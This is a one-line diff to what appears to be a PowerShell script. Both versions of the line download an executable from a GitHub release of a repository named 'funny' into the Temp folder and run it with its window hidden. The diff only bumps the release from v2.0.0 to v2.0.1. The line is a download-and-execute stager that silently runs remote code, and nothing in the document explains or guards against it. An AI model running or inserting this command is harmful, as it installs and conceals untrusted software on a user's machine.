@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri "https://github.com/greenstorm5417/funny/releases/download/v2.0.0/main.exe" -OutFile "$env:Temp\funny.exe" -UseBasicParsing; Start-Process -FilePath "$env:Temp\funny.exe" -Wait -WindowStyle Hidden 
+Invoke-WebRequest -Uri "https://github.com/greenstorm5417/funny/releases/download/v2.0.1/main.exe" -OutFile "$env:Temp\funny.exe" -UseBasicParsing; Start-Process -FilePath "$env:Temp\funny.exe" -Wait -WindowStyle Hidden 
